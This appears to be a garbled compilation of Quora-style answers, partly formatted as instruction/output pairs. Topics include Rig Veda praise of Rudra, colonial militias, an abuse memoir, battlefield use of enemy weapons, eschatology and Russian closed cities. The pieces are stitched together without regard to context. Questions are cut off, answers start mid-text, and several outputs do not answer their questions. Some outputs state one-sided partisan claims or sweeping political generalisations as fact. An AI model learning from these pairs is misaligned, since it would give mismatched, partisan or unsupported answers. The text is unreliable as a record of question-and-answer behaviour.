mīḍhuṣṭamāya tavyase। vocema śaṃtamaṃ hṛde (RigVeda 1.43.1) What shall we sing to Rudra, strong, most bounteous, excellently wise, That shall be dearest to his heart? RigVeda 2.33.8 maho mahi suṣṭutim īrayāmī, gṛṇīmasi tveṣaṃ rudrasya nāmaḥ. I utter forth mighty hymn of praises.We sing the splendid name of Rudra. Now on gyan khand part or Upnishad Khand, not some hymns or shloka but entire Upnishads are dedicated to him as God Supreme These are Upanishads of Rig Veda dedicated to Shiva. ,Nirvana Upanishad, Atma Bodh Upanishad, Akshamalika Upanishad, Naad Bindu Upnishad. There is no point referring shlokas of these Upnishads as they are totally devoted to shiva Principle Tattva. kumāraś cit pitaraṃ vandamānam prati nānāma rudropayantam (RigVeda 2.33.12) I have surrendered myself to you as a boy to the respected father approaching. bhiṣaktamaṃ tvā bhiṣajāṃ śṛṇomī (RigVeda 2.33.4) I hear you as the most curing among all curing. Haste vibhrad bheṣajā vāryāṇī śarma varma chardira (RigVeda 1.114.5) Whose hand filled of sovran medicines. Grant us refugee, protection and shelter. apabhartā rapaso daivyasyābhī (RigVeda 2.33.7) Deliverer from defect of the Gods. bṛhantamṛṣvamajaraṃ (RigVeda 6.49.10) bhūrer dātāraṃ (RigVeda 2.33.12) The giver of many. mṛtyormukṣīya māmṛtā (RigVeda 7.59.12) who provides immortality through Moksha. 6) Revealing of Desire of Rudra Consciousness: RigVeda also reveals about state which sages seek where perfect thoughts of Lord Rudra comes to their mind. ie. Wishing of full mind devotion to Lord Rudra: ā te pitara marutāṃ sumnam etu (RigVeda 2.33.1) May your perfect thought come to us Oh father of Maruts. ā vivāseyaṃ rudrasya sumnam (RigVeda 2.33.6) May perfect thought of Rudra comes in mind. Lord Rudra in Vedas has one peculiar characteristic ie. He is stated as the one without second. YajurVeda Taittariya Samhita 1.8.6 clearly states 'Eka Eva Rudro Na Dwitiya.' ie. 'Rudra yields noone to second.' Now a question arises whether this is just Arthavãda or has special significance. It is not Arthavãda because same verse is derived by Svetasvatara Upanishad in 3.1 and used as to glorify Brahman 'Eko hi Rudro Na Dwitiyaya... '. So, Lord Rudra is the one who is without second. Same thing is also revealed in Rudra Suktas of RigVeda: also Shivas fragment, which Shree Shankaracharya re established again. He is no regular God, He can absolve any Karma change destiny and capable of giving well being of all kinds here and in afterworlds. He is the greatest Surgeon greatest Healer The Vaidynatham. And he can liberate Give moksha to his Devotees Kaivalya Bramha . Those who worship him with devotion are devoid of death or any thing negative. Both Yajurveda and Rig veda declare Shiva as Most terrifying Destroyer of Gods and Death even (Ghora), and both consider him as Ultra benevolent greatest healer and happiness giver who can enlighten and change destiny if needed for welfare of bhakta (Aghor) who protects and prospers his worshipers. There is no point referring shlokas of these Upnishads as they are totally devoted to shiva Principle Tattva.

And there are around 21 unpublished Shaiwa Upanishads which i am not including. Now for Scholars and Researchers You can find Shiva in all of these Upanishads most of whom are widely available in many translations. I can as said above write a fat book on Shiva in each Veda separately but as a write up or answer this is more than enough to establish that as Sun is the centre of our solar system, so is Shiva the greatest God among all as Vedas not said or sung but DECLARED. EKO HI RUDRO NA DWITEEYAY.

The US was one of the few colonies of the British Empire who earned their independence through war. I wont go into the reason for the war because the skeleton of that long dead horse is still being beaten on here but basically the Colonies wanted a seat at the table and weren't given one. Since there was no standing American army at the time then where did our soldiers come from. Well they were the farmers, shop owners, dock workers, slaves, and woodsmen who made up the army and especially in the early days they were armed with their own personal weapons. While militia was crucial early on after 1778 the continental Army came into its own come out of Valley Forge. And even after that point militia served a huge part even if it wasn't bearing the brunt of the battles. Especially early in the war preventing Cornwallis from moving north to join Howe/Clinton in crushing the Army under General Washington. Daniel Morgan was very adept at using militia, with the militia playing a key role in the victories at Saratoga and at Cowpens. Now why is militia important to this argument. The militia’s were mostly armed with their own weapons, using a weapon you aren't familiar with you aren't gonna be proficient with which means that you are fairly useless in battle. In fact the militias had an impact later on in the war of 1812 in support roles. In particular the major US victories of New Orleans and Plattsburg. But apart from that they believed that everyone had the right to protect themselves, their families and their property. They believed this to be a God given right not a right coming from a piece of paper. The Native Americans who raided settlements could have done a lot more damage had the local populace had to wait for someone to come to their aid. So in summary the founding fathers believed that an armed populace was necessary to prevent 3 things. An oppressive government, fast defeat at the hands of a foreign foe, need for a large standing military."},{"instruction":"Am I wrong in believing that both Democrats and Republicans have poisoned the well by using prejorative terms like communist, fascist, Russian bot, Chinese bot, etc.?","output":"There is only one political side that would poison a well and that’s the Democrats, When Republicans call Democrats socialist or communist it’s because of the things they say they want to do and the way they act towards the other side of the political isle as well as the methods and tactics they deploy that are no different than those of an authoritarian or socialist style government And on the other hand Democrats call Republicans fascist because Democrats have a really bad habit of accusing others of what they are guilty of themselves, and Democrat leaders know that what ever they say or however they mislabel others their loyal supporters will eagerly and blindly echo the same things they hear their political leaders say….

Being the person who has to leave is very difficult. Note: While writing this, I saw that this is going to be a long one. If I do end up posting this, it’s more for me than it is for anyone else. If you have read this, I hope I was able to provide some insight as to why people stay in abusive relationships from my own personal story. I was married from January 2014 to August 2016. Dating and Marriage:I had met my ex while I was in South Korea teaching English. She was South Korean, born and raised in South Korea. And when we were dating, she was the perfect girlfriend. Caring, kind, supportive. I’ve had many relationships but I thought she was the one. When I wanted to return to the US as I didn’t want to teach anymore, I wanted her to be with me still. So, I proposed to which she said yes. Decline:When we were dating in South Korea, we lived in a metropolitan city with many amenities and things to do. She was a city girl, through and through. Suburban life might as well have been rural life to her. She blamed me for taking her away from her country. Blame lead to resentment. Resentment lead to hate.Ultimately, we became toxic to each other. Abuse:Emotional, mental, physical. She called me weak, immature, stupid, etc. I wasn’t any of these things but I became these things. I second-guessed myself every time. I was afraid to make mistakes that I ended up making mistakes. Small mistakes like driving over the curb because I had turned a little bit too sharp was met with a barrage of insults. Being called stupid in public in front of people, my confidence was absolutely shot. Alcohol was the cause of her physical abuse. I will remember all of our fights, she does not. She became a completely different person when she was drunk. Speech slurred, glossed eyes, randomly screaming, spitting on the carpet/on me, punching/kicking holes into the wall, punching/biting/kicking me. I would have to barricade her in our bedroom until she passed out which was always at 4am. Our first physical fight, she was deeply apologetic after as she saw the damage she did to our home and me. Our next four physical fights, she didn’t care at all and blamed it on the alcohol. Rationalizing Abuse:NEVER could this happen to me. I can NEVER be stupid enough to be with someone who abuses me. Until you are. Every fight that you have, you start blaming yourself. Maybe you could’ve done something differently. Maybe you could’ve been more supportive. Just make sure she doesn’t drink anymore and you won’t have incidents like this. I was defeated. My confidence at an all time low. I couldn’t and didn’t want to tell this to my family and friends because it was embarrassing and shameful. I didn’t want them to worry. Divorce:I remember this fight vividly. She doesn’t because she was completely wasted on alcohol. She wanted to leave our home in her completely intoxicated state with car keys in hand. I put myself between the door and her to prevent her from leaving. This lead to a fight which lead to her being arrested for domestic violence and me sent to the hospital. I still have scars from that fight. This was the first time outside people were involved, including our families.Her parents in South Korea wanted her home immediately. The divorce was quick and relatively smooth. We both knew it was done and she was desperate to go back to South Korea. Aftermath:I was never diagnosed but I can say that what I felt afterwards was PTSD. Certain moments would trigger anxiety attacks which had me vocally screaming to forget. I told my friends what happened but that I didn’t want to talk about it, that the best thing for me at the time was life as usual. I had trust issues for a looong time. Even when I went back to dating, I would think… okay, this girl is kind now but she can also be violent as well. Now:It has been five years since and a lot of it is water under the bridge. It took time and other methods to recover. My last triggering moment was when I saw the South Korean movie, Parasite. There was a scene in which one of the main actresses became drunk and belligerent. Conclusion:I don’t have advice that you have not heard before. All I can say is that I know how being in an abusive relationship feels like and I hope that anyone who is in one is able to get out of it."},{"instruction":"w will humans look in 1000 years?","output":"1000 years isn’t long enough to assume drastic things purely by nature without human intervention. However, based on that, if ethnic lines cross over culturally and reproductively, we may likely lean into being almost uniracial-yet-mixed with near everything. If the atmosphere lessens in ultraviolet radiation, we may get slightly lighter, but not by much. If it worsens, then darker complexions would likely be the norm. That, however, implies it goes further north, whereas the most ultraviolet radiation is in the southern hemisphere (Sup-Saharan Africa, South American, Southern India, Pacific Islands, Aboriginal Australians, etc.). Many biologicaly differences between ethnic groups are based on environment and culture, so it’s possible that we may share more features with each depending on lifestyles we adapt.

Even it’s better for certain work. In games and VFX industries which heavily uses GPU and custom-built computer, Windows is much preferred. The same for 3D modeling, CAD, or architecture; most industry-standard tools are more compatible with Windows machines. For graphic design and 2D illustration, both Mac OS and Windows are great.

On the other hand, Russia had the raw resources but not the technology advances nor the advances manufacturing to be able to pump out the enormous amount of machinery, weapons, or ammunition without the time that the Lend/Lease Program bought them. Without the equipment from the US, the Germans would have rolled over the USSR like a storm…because they would have been fighting poorly armed farmers. It wasn’t JUST the US soldiers that helped win the war…it was the enormous amount of materials that the US sent over that bought the Allies the time to spin up their war machine so they could actually fight."},{"instruction":"Do soldiers pick up fallen enemy weapons to use if they are out of ammo on their weapons?","output":"In the US Military, things are almost always planned for. There are rally points, fallback locations, rest/refuel/re-arm spots. Additionally, soldiers (or airmen, seamen, or marines) are never alone, even a two-man team is unusual. A soldier (or airman, seaman, or marine) who is out of reach of his unit, is not going to happen (under most circumstances, in these modern times). A platoon or squad will know that they are in the red with ammunition (red meaning low, black meaning too low to be mission capable). They know it's time to call off the mission, call for backup, or rally to a previous location. Command usually does not want a mission to fail, so the unit will almost always be able to get the ammunition or backup that they need. Sometimes, however, contingencies fail. Sometimes, units get ambushed, and a soldier might possibly become separated from any surviving team members. Sometimes, stuff just happens, and it would be folly to say otherwise. It is generally considered bad form to pick up an enemy weapon. 1. It is immoral to “loot” dead soldier's. 2. It is against US Army regulations to loot dead soldiers. 3. It is against the laws of war and Geneva Convention to loot dead soldiers. 4. If you want the citizens of the country you are in to trust and like you (as in the Iraq War), then you do not do the things that the Ministry of Misinformation (actually called Saddam's Ministry of Information, but we called it like we saw it) tells the people that you will do. E.g. looting, raping, pillaging, needlessly killing innocent civilians, etc. You instead act cordially and humanely to the populace that you are “liberating”. (I used quotation marks because while we might see it as liberating, their opinion might differ) 5. Enemies have been known to booby-trap weapons. Even dead soldiers have had the forethought to ensure that their death takes out other enemies. I don't have any research or evidence; but, I was told stories (from multiple SNCOs) about enemy soldiers lying face down dead, who were rolled over, and the enemy soldier held a live grenade, without a pin, under him, which exploded, taking out his enemy. If I am not mistaken, this was stories about the VC in the Vietnam War. 6. The weapon that the enemy has is not a weapon that you are proficient with. (Imagine being skilled in using a short sword, and you pick up someone's longsword, you aren't going to be as good with it as the ones who train with it). It is the same with firearms. Even a specialized soldier who has trained on multiple weapons and can pick up any weapon and be proficient, will tell you that he will use it sparingly, because he knows that he is at a disadvantage to an enemy who uses it everyday. 7. You have not cleaned or maintained that weapon (do you even know how to take it apart? Which pieces need the most lubrication? How to perform immediate action, when it misfires?). The enemy may not have cleaned or maintained it very well either. (Such was the case with a majority of the AK 47s and other weapons and equipment which we found in Iraq). 8. Ammunition. What are you going to do when you run out of that ammunition. 9. Soldiers (airmen, seamen, marines) know the sound of their weapons fire. They also know the sound of the enemy's weapons fire. You don’t want to make yourself into a target of your own troops. All that being said, if a soldier (aitman, seaman, or marine), or even a team, that finds himself alone with no ammunition, no means of communication, and no guidance, will definitely take the risk of picking up an enemy weapon and using it rather than be defenseless. No command is going punish you for doing so either. It should be noted that if you are found to have picked up and used one, unauthorized, without necessity, you could face military charges for it. If that soldier still has it in his possession when he is reunited with his command, he will have to relinquish the weapon. Under no circumstances, is the enemy weapon going to be able to remain in his possession, once he is on friendly ground. So, no, it is not allowed. Yes, extenuating circumstances could make it excusable. No, its not a good idea, even under the most extreme duress. Yes, even though it is a bad idea, if it is your last choice, do so. Personally, I would rather hide than use an enemy weapon…because of the reasons that I previously stated, it has the potential to be more deadly of a decision than simply falling back, hiding, or playing dead."},{"instruction":"What did you get for Christmas 2017?","output":"Hi Sajid: I got The Girl with the Dragon T-shirt.

Consequences: Eventually all the foreign companies will vanish from India because labour cost is too high in India i.e., 43k USD whereas in USA its just 10k USD. All the Indian companies will migrate to some other parts of the Globe where the labour cost is low.India will loose 40 million jobs and then due to unemployment they will again start working for low salaries but their loans and other commitments are already prescribed with previous standard economy and they will not be able to repay their debts.The Indian economy and all the banking corporation will collapse .

That means 1 INR will no longer be equivalent to 1 USD ( india back to the normal situation) ========================================================== In order to achieve power similar to USA ( 1 INR = 1 USD)-{ highly unlikely} Gradually: Indians will have to start using all the Indian products and start manufacturing all the necessity products in India itself. Imports should be minimal and exports should increase on a large scale. Many Indian startups should be on par with with world class firms. Entire country should be employed which gradually strengths Indian economy and above mentioned equation can be achieved."},{"instruction":"What do New Zealand people bring to the evacuation site after a tsunami warning?","output":"Thank you for using your name.

Should I sit in on his class for a day?","output":"I’m not a parent (and at this point in life, never will be), but I have gotten in trouble in school before (not every day but more than a couple of times). Sitting in class will only encourage whoever is in the wrong to clam up and hide their behavior. Note I didn’t say your child. I agree with others, talk to your child, talk to the teacher, see if you can understand what’s going on. I think I’d go at it with a neutral attitude. Try to get both sides of the story. Maybe it’s a bully, maybe the teacher is the bully, maybe it’s a coolness factor (I think that was it for me; I was in a new school and amazing it didn’t happen more than it did, but I grew out of it. I still remember going camping with my dad, rest his soul, and having a few heart-to-heart talks before the new school year started)."},{"instruction":"Why are people able to get up on time and work hard for other people but struggle with doing it/working for themselves?","output":"I guess it’s called personal discipline."},{"instruction":"What is the easiest and best way to wake up in the morning?","output":"Set an alarm, remove the option for a snooze button, get 7-8 hours of sleep, and once you wake up, drink something. I found that when I left Gatorade by my bedside at night, I would wake up, take a sip of the Gatorade and immediately feel SO much more awake. The main thing, however, is that you never give yourself permission to ever fall back asleep, even for 5 minutes. It will create a negative habit that reinforces you doing it all the time. Make the decision now to wake up and STAY UP whenever your alarm goes off. It has saved me more times than I can count."},{"instruction":"Why have there been so few images been released from the James Web Space Telescope?

It is also a great website for people who are trying to improve their English language. Quora can help you polish two main skills: reading and writing. It can also help broaden your vocabulary. When you first sign up to Quora, you will be asked to select the topics you are interested in. Once you do that, you can start reading! By reading on Quora every day, you should see a huge spike in your English vocabulary. You must write down all new words in your vocabulary notebook.

Pacifism does not always work, sadly."},{"instruction":"Did beards go out of style in Western countries at the turn of the 20th century?","output":"The 1900s saw lots of inventions, including the safety razor put in wide use. Before then, men just basically trimmed as shaving was a real chore with a knife. Then during the world wars, being clean shaven was required to serve, and all those millions of men came home indoctrinated into needing to keep clean shaven. And passed that down to their sons. When I was in the 70s, I grew my first beard and few guys had them. I had many people, some strangers, tell me “You need to shave that off” like they have any say over me and my appearance. Today no one does that; most males in the US have some sort of facial hair it seems. But if I look at old photos of my grandfathers and great uncles around early 1900s, (my grandparents were all born in the 1880s) they all had beards. It wasn’t until the later 20s and 30s pictures show guys clean shaven."},{"instruction":"w much does centrifugal force generated by the earth's rotation affect an object's weight?","output":"It very slightly reduces the acceleration due to gravity.

By the way Aristotle was a Macedonian too, who had made a great reputation as a teacher in Nationalistic Athens(That’s the Reason Philip had chosen him as his son’s teacher) and is the most complicated in writting style along with Plato. Still the best philologists aren’t 100% sure what he is really talking about, in many chapters of his books. P.S. A Correction. Myrtine-Olympias wasn’t speaking Hepeirotiken Dialect. She was speaking Apeirotican. Hepeirotiken is how the Attica Dialect Speakers(Attican is a Subdialect of Ionian Dialect) were naming the Dorian Subdialect she was talking."},{"instruction":"What is issuing authority in a passport?

Jim Jordan (GOP) said that it’s the President’s call to use his private lawyer as the point man for foreign policy instead of a duly appointed cabinet official. Is he correct?","output":"There are many ways of negotiating anything. There are often informal discussions about having a discussion. Informal discussions cover the widest range of topics so that when an advance is made to holding formal discussions much of the chaff has been removed from the wheat. This saves time and effort. In the original transcript which was released Trump made it clear that he trusted Mr Giuliani as his lawyer and a person that was generally knowledgeable. Nothing more, not a diplomat or as anyone with plenipotentiary powers to negotiate anything. He is just someone Trump trusted to carry a message. The classic case of informal discussion. Trump obviously did not trust Obama’s choice for an ambassador and by that time she was out of the picture in any event. The President of Ukraine felt that getting rid or her was a good thing as she had been unable to establish a working relationship with him.

You’ll need to read through your contract carefully. Most of the time, they only own the ISBN and possibly the artwork for your cover. If that’s the case, then to republish you’d just need a new ISBN and a new cover.

For the Partial, if they're Amillenial (they believe the “millennium” in Revelation 20 is spiritual and typically started with the atonement on the cross or Pentecost I guess and is current until Christ's second physical “coming”) then they could have an optimistic view of a degree of gospel transformation of the world (maybe a “falling off\\" before Christ's coming) or think that increase of good, gospel-way, and bad is kind of even keel in balance. Then, Christ's second coming, judgment, and a new heaven and earth and physical resurrection bodies dwelling on earth with nothing bad on earth for those justified. If they're Postmillenial, then again, different flavours, but that we'd be in a millennium at some point or else now with more literal import now because of the spiritual, particularly what was established in AD70 with the end of the Old Covenant, the establishment of the New covenantally, Christ's spiritual coming in judgment and salvation being past (what transpired complete by AD70 being held in higher regard and understanding, spiritually). For them, the millennium could last for thousands of years, will see a very optimistic transformation of all structures in the world over time (some are gospel-centred in a spiritual sense and others have unfortunately been legalistic and social), maybe something of a falling off at the end just before Christ's second physical coming, and then the same as the amil. Sometimes with amils, but usually with Post-mils, a mass salvation of a literal Israel/Jewish people through coming to faith in Christ and the atonement features, too, just before Christ's “second\\" physical coming. Of course, every professing Christian is at least a Partial Preterist in some sense, as everyone believes Christ's death and resurrection and the giving of the Spirit at Pentecost fulfilled at least some of the eschatological promises already, but typically the aforementioned kind of covers Partial Preterism per se..apart from “Historic Premillenialists” (there are probably very few with this view today), who believe in a literal thousand year reign of glory in some “spiritualized geocentric sense” from a literal Jerusalem on earth prior Christ's second physical coming in glory, but are fundamentally distinguished from Dispensational Premillenialists in that the Historic have Israel (as well, a literal Israel, modern day Jews) being saved by being added to the church via the gospel, not having any other inheritance but as is found in the church through Christ. Other Premils, not so - they really chop things up and have two peoples, covenants, etc, and lots of brackets to that flow of God's purpose and plan in history, because they don't have a single united redemptive inheritance, history and thus gospel, ultimately. But they wouldn't be called or typically call themselves Preterists of any sort. As to “Full Preterists”, or some form of “covenant eschatology” believers like me, it would depend. There are often with these things something of a spectrum of views and some that I would distance myself from, too, at points. Such as the view that fails to comprehend the physical within the scope of spiritual resurrection. For my part, as with many, understanding that eschatology is the establishment of gospel promise and leaves behind it a “redemptive history\\", and the gospel is none other than the gift of Christ's finished righteousness reckoned as our own forever (post final judgment) reconciled to God and having resurrected us from the curse of the fall to all the grace of this “kingdom\\" in God's full favour, then blessing isn't over, it's truly begun in the full, kingdom sense, upon eschatological fulfilment. Like the strong amil and post-mil have understood, “fulfilment\\" with respect to “covenant” is about “spiritual inheritance obtained\\" etc. To use the biblical motif of marriage to describe it, as the bible does, after the cross/Pentecost there was a “now-not yet\\" with regards fulfilment and inheritance: like an “espousal”/engagement and then a “wedding day” whereupon the fullness was entered in upon spiritually. Per the ancient Hebrew and biblical concept, the “espoused\\" bride and husband were as-if married already in the sense that engagement had a very strong sense of “inheritance of future inheritance” that would be “consummated\\" in that public wedding day marking “dwelling together\\" joint-heirs of “the grace of life\\". Well, this is the same idea spiritually. Only the gift of post-Judgment justification and the kingdom of that fellowship and all its graces isn't any longer “not yet\\" to us. (Every other position previously mentioned says fundamentally, we're still in that New Testament “now-not yet\\", a “Bride-to-be\\"..even though some Post-mils have said, somewhat inconsistently with the “not yet\\" of their position, that the “marriage day\\" is past). But it's now in “Full Preterism” or a “Covenant Eschatology”. Yet, just as when a man and woman marry, the blessing doesn't become passive because fulfilled, realized on that day, but begun as active in the fully “mature\\" sense of their relationship, so too spiritually. So there's ongoing fellowship with God in all the blessings of spiritual resurrection through justification, concerning all of our God-given humanity once saved, having received his justification. As people truly “come of age\\" in the blessedness, rather than children waiting upon it. The kingdom has come on earth in a mature sense in those in Christ and thereby everyone else, just as Christ has already entered his gospel kingdom, delivered it up thus complete unto, with, His Father, having put all his and his Bride's enemies under his feet spiritually, and so there are ongoing happy, manifest consequences of the now direct inheritance. As to prophetic outlook on the world from where we now stand in this “New covenant age\\" post AD70 (the Old Testament and the New anticipated the consummation, the full establishment spiritually of the New Covenant upon the sign of the destruction of the Old's temple at a literal Jerusalem within such a time frame, which marked the disappearing of the old age and the dawning of the new in Christ) of course one couldn't say there are more specific prophecies left. But with the general tenor and intent of the gospel which is, as I say, far from finished, but rather “matured\\" in terms of “where we're at in state of blessing come\\", and with ongoing consequences in fruit for those in Christ, salvation by grace alone through faith alone in Christ for the world, and, as I would say, a hopeful view on the gospel transformation of the whole world over time, in the widest sense, accordingly. Not because we're still in the millennium or because there's more saving work to be brought by Christ “redemptive-historically”, “eschatologically”, “prophetically”, but because there is most definitely the greater manifestation of his gospel glory and finished work in fellowship with God now “dwelling with us\\" spiritually in Christ, on earth as it is heaven. So for my part, with that logical priority sketched, I do have a certain gospel hope that you could say looks like a “post-mil\\" one in one sense, albeit the spiritual gospel sort, but because of the kingdom of resurrection from the Adamic curse already come, “marriage” already here in Christ, not prospectively ahead. And therefore, a “filling up of what's been fulfilled\\". But, other Preterists would probably consider things more like, perhaps you could say, an “everlasting amil\\" outlook on earth, and point to the end of Revelation (and Isaiah 65, 66, from whence comes the “new [covenant] heavens and earth language\\" where there's the kingdom come on earth, and an “outside the kingdom\\" contemporaneously as “last look\\" of eschatology - Old and New Testament the same theme). Of course I agree that's what things look like by definition upon “marriage day\\", and that by no means are all saved because some are, but I would say they're a bit too hung up on that one day in that regard, over the spirit of what has begun on that one day in Christ, and the wider and eternal ramifications. No, I'm not a Universalist, but I do (somewhat tentatively, yes) suggest an ongoing transformation of the whole physical world over time according to gospel benefit in Christ through faith in repentance, according with the spiritual, with the Bride of Christ right at the heart of that, and greater “common graces”, accordingly, not least with time. This isn't to speak of the rate of transformation having to be constant etc, nor that great sin and evil can't happen, or things like the world wars in the last 100 years, or that people have been made of fundamental new, good nature prior to new birth, justification, salvation. No. But it is to suggest that, Christ is sovereign, Satan is no longer “the god of this age”, and Christ has fulfilled his gospel promises such that God would shed forth his kingdom graces and we'd enjoy him and them in living fellowship accordingly, forever. Of course, I do believe in a heaven, and I do believe that's when we experience the fullness we already have in perfect fullness. But also, that there's more on earth now and for the earth now than is often believed, even in the professing and even actual “church\\"/justified peeps, because we're not properly waiting on “God’s rest\\", his kingdom, in the ultimate spiritual sense anymore. Thus, we can put down a “deferred hope that makes the heart sick\\" the more we dwell on it, for the faith of a realized “life and life abundantly”, and according hopes. Physically, too, etc..with a spiritual (and yes, consequently, a true practical), rather than “what appears\\" focus and logical priority to it all."},{"instruction":"w hard is it to trace a VPN?","output":"It can be traced to the VPN provider and from there to you, but only by those who are allowed to do that (official government organisations) or by hackers, if the VPN servers are not secure."},{"instruction":"What are the best freelancing sites?","output":"For my opinion I think that fiverr is the best option for anyone, because it is free and have a lot of client around the world, there are more than 60 Millions visitors for fiverr, and it offers a lot of methods of payment ,frankly it is the best one this is the link to sign up and make your first dollars.

Tasks like singing a song in front of relatives, performing the new dance manoeuvre in front of Mummy and Daddy and simple arithmetic and spelling tests are examples of early tests. Some children thrive on showing everyone how good they are and as a consequence grow older with a positive association to tests and exams. Others feel embarrassment, perhaps are ridiculed and end up with a negative association to tests. From the associations formed with early tests, we create generalisations that either support us in exam conditions or bring us out in a cold sweat. We create mental filters that mediate our experience, so in the present day state we run mental programmes as a result of the filtering of internal and external stimuli. The output will be exam anxiety or exam confidence (or perhaps somewhere in the middle) depending on the individual. Generally, anxiety and studying for exams do not go well together. However, according to Csikszentmihalyi (1990) a low level of anxiety, combined with focus and heightened awareness are components of a ‘flow’ state. However high levels of anxiety while revising or taking the test itself severely limits recall and flow of information I would suggest an overall strategy for passing exams that includes being aware of the bigger goal, visualising success, creating an optimal learning state, planning study and being a smart reviser.

Here are 11 points on how, in my opinion, to make the most of it: “Your time spent in a fraternity basement is not time wasted” - Charles Wheelan. Obviously this point is broader than just frat basements. I’m referring to time spent at club events in Hart House or playing soccer games at Queens Park with friends. Even though there will always be work to be done, make sure you allocate time for having fun, making relationships, and going on a few dates here and there. This is the time to make life long friends and get experience dealing with people in various situations. Relationships are all that matter in this life, so prioritize accordingly. I should mention in parallel to this that alcohol & drug abuse is one of the leading factors that causes depression, so I’m advocating for the comraderie that these activities bring about and not necessarily the libations.Attend every lecture, but don’t take notes. Now this is a contrarian piece of advice, as I imagine lots of people will disagree with me but let me ask you this, do you take notes when a friend tells you a story? Probably not. But you can still recall the details of their story, right? That’s how I treated lectures. The guy or gal lecturing is simply telling you a 2 hr long story. Just listen attentively for the entire time. Additionally, most profs post lectures online so you can always refer to those.CGPA matters the most, so if you happen to be failing a class drop it immediately. Don’t risk it if your already failing a class. Chances are it will only get harder as the class progresses so no need prolong your suffering. This will also save you from having a failing grade on your transcript, which is extremely hard to make up thereafter. You can always re-take the class in the following semester or over the summer.Use the UofT brand to your advantage. You pay thousands of dollars to be there, not to mention that you worked hard to get admission. It’s one of the best academic brands in North America. Milk this opportunity as much as you can and start ASAP. Send emails to alumni who work in the industries you may wish to join after graduation. Get coffees with them. Ask a lot of questions. Do the same with professors, administrators, executives, etc. The more people you know, the more avenues you can exploit to get a job.Go to the dedicated UofT dentist. Some folks don’t realize that UofT includes the price of their comprehenisve dental plan into tuition charges. Even if your teeth are fine, book a cleaning/check-up anyway. You already paid for it.Live in dorms for at least two years. There is no better place to make great friends than in your dorm or residence. I recommend at least two years in a residence, as a result.Budget. This doesn’t mean just monetarily, although that is obviously imperative. I also mean this with your time. The thing with university vs. High school is that, in university, no one is watching you. Go to class, don’t go to class. No one cares. Study or don’t study. No one cares. Ran out of time for assignments submission? No one cares about your excuses (unless you have prior authorization, of course). You are responsible for your own time. No one will be watching what you do, or scolding you for not doing things. Your finally your own boss, but that has its down sides.Exploit resources on and off campus. There is lots of help for students at UofT. Get to know a person in your registrar office, and go to them regularly for help/planning. Familiarize yourself with the placement office and use them to your advantage throughout your university career. They will help you create a good resume, improve your interview skills, and land a job post graduation. Off campus, go to various events on Meetup dot com or through Eventbrite and broadcast your occupation as a student looking for interesting opportunities off campus. People look for this type of initiative. Furthermore, Toronto is a major city…you never know who you may meet or what doors you may open.Get to know at least three profs personally. They are good resources for advice and they are well connected. Also, if you plan on doing a masters, you need a recommendation from a few of them. That will be much easier if you developed a good relationship with them, early on.If you can afford it, take advantage of summer abroad programs. Although I was never able to, these programs are pretty badass. You can go anywhere in the world and live there for 6 weeks with your classmates. Traveling is a great way to broaden your perspective and gain worldly knowledge that could stack your resume. You get a credit for doing it too.Finally, don’t take it all too seriously. Even though you will be dealing with a lot more “adult” stuff than you did in high school, don’t forget that your still a kid. In these types of premier institutions there is a lot of pressure and some people may seem as though they have everything figured out. This can be intimidating, but don’t let these people fool you. We are all unsure and confused, just some of us are better at hiding it. You have a lot of time to figure things out, so don’t put unnecessary pressure on yourself. Just do what your suppose to do, when your suppose to do it, and fortune will bow to your efforts."},{"instruction":"w can I download magazines for free on the Internet?","output":"Project Gutenberg.

If the situation becomes dire enough, first the people of the countryside will be allowed to starve or entirely fend for themselves, and then the common people of the open cities will be allowed to starve. All remaining resources will be focused on the central government, the elites in their gated communities in the open cities, the closed technical research and manufacturing cities, and the military bases. So you may be asking, what is a closed city? , Russia is an authoritarian country with a different way of thinking compared to democratic countries. Rather than the government existing to serve the people, the people serve the government, and more specifically a ruling party, that is effectively acting as a monarchy established by overthrowing the previous rulers. Any resemblance to democratic countries is just window dressing at best, or done in open mockery and defiance of how the rest of the world does things. When the Russian government wants to do something, it takes over a region of its rural countryside away from the general population, builds a strong, tall fence around it to keep out the locals, and pours all its money and resources into building up technical knowledge and expertise, with the goal of accomplishing a specific function. A closed city is very similar to what the rest of the democratic world would call a military base, and in Russia that is often the focus of interest for their closed cities, such as weapons development or manufacturing. But the people who live in the closed city are mainly not soldiers, and there isn’t as much saluting and goose-stepping as compared to a military base. The people allowed to live in the closed city by the government are generally the most intelligent, the most wealthy, or the most politically well-connected. These people know the privileges given to them, and they are careful to stay in the good graces of their central government benefactor. , Meanwhile the people in the countryside do not have access and may not be allowed to know what is going on inside the walled city. They live a subsistence level existence, just getting by, and the government does as little as it can to provide for their needs. It is common for the people in the countryside to have no running water in their homes and to still be using pit toilets outdoors rather than plumbing and septic systems. They may have to grow most of their own food and keep some animals for livestock to feed them, when the government won’t. When Russia is at war, the people in the countryside are going to suffer first from the lack of resources. The people in the closed cities will generally remain unaffected by resource shortages for a long time. As far as the Russian government is concerned, the general population of the countryside are expendable, a resource to be exploited, like coal or lumber or anything else. If they need to be sacrificed to accomplish the goals of the ruling party, that is fine. Just so long as the closed cities get the resources they need. , The situation is more complicated in open cities like Moscow, where this divide between strong government control is not so clearly defined. The general population mixes with the elites, who may have their own gated community within the larger city, but the elites still need to come out and mingle with the commoners for access to city services. And there is the problem of common people in the open cities, who think they have more rights than the central government allows them to have. This is why there tends to be more conflict in the major population centers, because the central government can’t rule with an iron fist as easily as it can in the closed cities. But the government does still have ultimate control over the commoners in open cities since those people don’t have access to farmland for subsistence living without government involvement. If necessary the troublemaking commoners can be starved out of the open cities. , You may have heard in the news about brain drain in Russia shortly after the war started, with people leaving Russia to avoid conscription. These are primarily the more wealthy commoners, hangers-on and foreigners living in the open cities that don’t directly serve the central government. The Russian government is likely happy to see these people leave as they are just troublemakers anyway, with their imaginary ideas of free speech or gender deviancy or race equivalence, brought in from other parts of the world. The actual elites in the gated communities of open cities and in the closed technical cities who are loyal to the government meanwhile are not going to leave, because they are exempt from conscription and austerity. , Nationwide facilities such as electric power or roads are similarly managed. There will be well-maintained huge-capacity power transmission lines and concrete-paved 4-lane highway infrastructure in place for linking the closed cities and military bases, while the commoners in the rest of the countryside may be getting by on severely rutted and potholed dirt tracks. These intercity services may be for similarly gated/fenced exclusive use by the elites, or somewhat open access for the commoners, with the understanding that the commoners must get the hell out of the way when the official designated users of those services are coming through and need them. , References: [LINKED_TEXT: Closed city - WikipediaSettlements requiring authorization to visit Central entry checkpoint to the closed city of Seversk , Tomsk Oblast , Russia A closed city or closed town is a 